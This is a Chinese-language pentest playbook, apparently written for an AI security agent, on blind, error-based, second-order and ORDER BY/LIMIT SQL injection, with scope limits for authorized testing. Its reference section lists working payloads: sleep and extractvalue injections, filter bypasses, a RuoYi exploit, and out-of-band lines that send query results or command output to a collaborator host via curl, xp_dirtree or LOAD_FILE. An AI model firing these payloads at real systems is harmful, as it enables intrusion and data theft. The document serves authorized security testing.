---
name: sqli-blind
domain: sqli|injection
modes: [src, redteam, pentest]
exit_artifacts: [reproduction, impact]
---

# SQL 注入(盲注 / 报错 / 二次 / 排序翻页)

## Domain

- `'` 致差异;布尔 id; sort/order/page; 异常 handler 回显
- Cookie lang / version 头等高频盲区
- **不要直接 sqlmap**(重武器 _PENDING)

## Boundaries

- 徒手确认优先;sqlmap 进 _PENDING
- 禁止 DROP/UPDATE 破坏;禁止 dump 全库 PII
- 证明注入用 harmless 布尔/报错/时间;提取仅最小样例证明
- 无提取证明的「可能注入」→ 勿 overrate(见 SQLi 定级 insight)

## Pivot Hints

- GET 无果 → Cookie/排序/翻页/二次注入
- 过滤 1=1 → MySQL 真值字面量
- 无回显 → OOB(授权 DNSLog)
- 国产 RuoYi params[dataScope] 等
- 5 payload 无信号 → 停,不堆 sqlmap

## Exit Evidence

### src
- E2: 可重放布尔/报错差异 + 最小数据提取样例
- E3: 能说明可读哪些业务表/影响
- 仅报错无提取 → candidate 或降档

### redteam
- E2: 确认注入点可支撑读凭据/横向即可
- 大字典 sqlmap 仍 _PENDING

## Tactics

> 原 Triggers / Coverage / Common misses / Verification 压缩如下;深度细节见文末 Reference(若有)。

> 手动确认最快路径。**不要直接 sqlmap**(L1 武器,需问)。徒手 5 payload 能确认 80% 注入点。

## Triggers (何时用)

- 输入 `'` → 500 / 报错页 / 响应长度不同;`'` 与 `''` 响应不同
- 数字参 `id=1` vs `id=1 AND 1=1` vs `id=1 AND 1=2` 响应不同
- **列表接口**有 sort/order/page/pageSize 参数(预编译挡不住,必测)
- **看到全局异常 handler 返 ExceptionMessage**(.NET/Java)→ 投畸形 SQL 看回显 `Incorrect syntax near`/`ORA-`/`XPATH syntax error`,可拼出表名列名

## Coverage points (查什么)

- **铁律 0 — 注入点全覆盖**:别只测 GET id/搜索框。整个请求包拆开逐一测,**一次只变一个参数**。4 类最值钱被忽略点:Cookie 语言参数 / 排序方向词 asc|desc / 翻页 page·limit·offset / version 头。详见 Reference。
- **排序/ORDER BY/翻页 LIMIT 注入**:预编译挡不住,是隐蔽高发点。详见 Reference。
- **真值字面量绕过**:`1`/`1=1`/`OR 1` 被过滤时用 MySQL 等价"真"替换。详见 Reference。
- **二次注入**:输入侧不报错(只是存),触发在"使用该数据的另一接口"(导出/客服/统计)。详见 Reference。
- **OOB**:不出回显时用 xp_dirtree/COPY TO PROGRAM/LOAD_FILE 打外带。详见 Reference。
- **国产框架**:若依 RuoYi `params[dataScope]` 报错注入,jeecg/ruoyi-vue 高发。详见 Reference。

## Common misses (AI 常忘)

- **只测 GET id/搜索框** —— Cookie 语言参数(lang/locale/i18n)、version 头、排序方向词、翻页参数都是高频盲区
- **排序/翻页参数不能参数化** —— 预编译挡不住,sort/dir/page/limit/offset 必测
- **二次注入输入侧不报错** —— 只是存,触发在另一接口,需抓后台触发请求确认
- **报错页堆栈泄露但无注入** → SRC 给低危,不算注入
- **SLEEP 一次延迟二次正常** → 网络问题,要求重复 3 次稳定
- **ORM 限制多语句** → 单查无 dump 整库能力,看具体危害

## Verification (verified 标准)

```
✅ 时延差 + 布尔差 + 改 payload 数据对应变化 → 中
❌ 仅延迟一次 → 网络抖动,需稳定复现 ≥3 次
❌ 仅 500 → 后端崩了不算注入(可能只是类型校验)
PoC 必须:baseline curl + 布尔真(AND 1=1) + 布尔假(AND 1=2) + dump(SELECT user()/version())
点到为止:取库名/当前用户即证明,不脱库。
```

## L1 提醒

- 徒手验证只读 → 放行
- `sqlmap` → 必问;同意后 `--level 1 --risk 1 --delay 5 --threads 1`(头/Cookie 注入点用 `--level 5`)
- **绝不在 prod 注 UPDATE/DELETE/DROP**(L1 写操作触发即停);堆叠注入 `;update`/`into outfile` 写 shell = 重武器,必问

## Related playbooks

- 参数级反射(`query/keyword/sort/orderBy` → SQLi)→ `doctrine/reflexes.md` 第一层
- WAF 拦 `'` → `skills/fingerprint/waf-evasion.md`
- 注入参数本身越权 → `skills/api-logic/idor-bola.md`
- SQLi→RCE 链(MSSQL xp_cmdshell / MySQL into outfile / 高权限)→ 升级前必问(重武器)
- NoSQL / GraphQL 内 SQLi → `nosql-graphql.md`

## Reference (深度参考 — AI 可能不会的细节)

### ⭐ 铁律 0:注入点全覆盖(最大盲区,先看这个)

**别只测 GET id / 搜索框。** 把整个请求包拆开,每个"会进 SQL 的输入"逐一测,**一次只变一个参数**(其余保持正常值,避免误判)。很多高价洞在最不起眼处。

逐处测的位置:
- **URL Query**:id/keyword/sort/order/page/limit/filter + 那个最后不起眼的参数
- **URL Path**(RESTful):`/user/1` `/api/v1/order/5` → 路径段注入
- **POST Body**:form / JSON(**嵌套·数组元素·重复 key·类型混淆**)/ XML 节点 / multipart 文件名
- **Cookie(高频被忽略)**:**语言切换 `lang/language/locale/culture/i18n`**(后端常 `WHERE lang='zh'` 直拼)、theme/currency/region/cart
- **请求头(高频被忽略)**:**`version`/`X-App-Version`/`api-version`**(按版本查表/灰度)、`X-Forwarded-For`/`X-Real-IP`/`Client-IP`(入库/黑名单)、`User-Agent`/`Referer`(统计入库)
- **其它**:导出列名/排序、批量 id 列表、GraphQL 变量、时间范围 start/end

**4 类最值钱的被忽略点**(优先怼):Cookie 语言参数 / 排序方向词 asc|desc / 翻页 page·limit·offset / version 头。

### 真值字面量绕过(`1`/`1=1`/`OR 1` 被过滤时)

`OR (1)` `OR 1.0` `OR 1e0` `OR x'31'` `OR b'1'` `OR '1'` `OR .1` —— 假值对照 `OR 0.0` `OR '0'`

### 排序 / ORDER BY / 翻页 LIMIT 注入(预编译挡不住,高频被忽略)

排序与翻页参数**不能参数化**,是隐蔽高发点:

```
# 排序:逗号判断(核心)
sort=1            正常
sort=1,(SELECT 1 FROM(SELECT SLEEP(5))x)   报错/变慢 = 可注
sort=(CASE WHEN(1=1)THEN name ELSE id END) 行序变化判真假(不能用引号时)
order by N / N+1  定列数(配合 union)
# 方向词 asc|desc(只校验列名、不校验方向 → 高频)
dir=asc,(SELECT 1 FROM(SELECT SLEEP(5))x)    dir=desc-- -
dir=asc,extractvalue(1,concat(0x7e,(select database())))   报错回显
# 翻页 page/pageSize/limit/offset → 落进 LIMIT
page=1 AND SLEEP(5)                          page=2-1 返回第1页 = 数字型
limit=1,(SELECT 1 FROM(SELECT SLEEP(5))x)    旧版 limit=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,version())),1)
pageSize=99999 / per_page=-1                 超大值泄露全量(配越权)
```
判定:改排序/翻页参数若 ①逗号被接受 ②报错 ③结果顺序/行数异常 ④除零/CASE 真假可控 → 注入。

### 二次注入(SRC 真正出钱的点,框架强项)

注入不在"输入接口",在"使用该数据的另一接口"(输入侧常不报错,只是存):

| 输入接口 | 实际触发点 |
|---|---|
| 注册昵称 `admin'-- ` | 后台导出/搜索用户列表 |
| 评论 `' OR 1=1 -- ` | 管理员审核页/评论统计 |
| 上传文件名 `1';UPDATE users-- ` | 文件管理后台/备份脚本 |
| 改资料 phone | 客服查询/投诉单关联 |

流程:注册号 A 昵称 `test'-- ` → 触发后台用该数据(导出/客服/统计)→ 观察报错/数据错乱 → 升级 `' UNION SELECT xxx-- ` 看回显。**需抓后台触发请求确认。**

### Out-of-Band(不出回显时)

```sql
-- MSSQL
'; EXEC master..xp_dirtree '\\<burp-collab>.oast.site\test'-- 
-- PostgreSQL
'; COPY (SELECT current_database()) TO PROGRAM 'curl <burp-collab>?d=$(id)'-- 
-- MySQL(Win+文件读权限)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.<burp-collab>.oast.site\\a'))-- 
```
需 Burp Collaborator / Interactsh / DNSLog。

### 国产框架案例(高 ROI)

```
# 若依 RuoYi —— params[dataScope] 报错注入(后台数据权限拼接处)
POST /system/role/list
...&params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
→ {"msg":"...XPATH syntax error: '~dbname~'"}  注入成立
```
其它:列表接口排序/翻页参数、导出接口列名,国产二开框架(若依/jeecg/ruoyi-vue)高发。

